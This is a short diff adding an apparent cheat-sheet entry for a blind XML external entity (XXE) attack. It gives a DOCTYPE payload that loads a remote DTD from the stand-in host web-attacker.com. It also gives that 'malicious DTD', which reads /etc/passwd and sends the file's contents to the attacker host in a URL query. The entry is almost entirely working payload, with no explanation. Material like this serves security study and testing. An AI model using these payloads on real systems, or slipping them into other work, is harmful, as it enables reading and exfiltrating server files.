@@ -1,0 +1,20 @@
+
+
+----
+Payload 
+
+Vulnerable Web site 
+
+<!DOCTYPE meow[
+    <!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd">
+%xxe; ]>
+
+
+
+Our malicious DTD
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
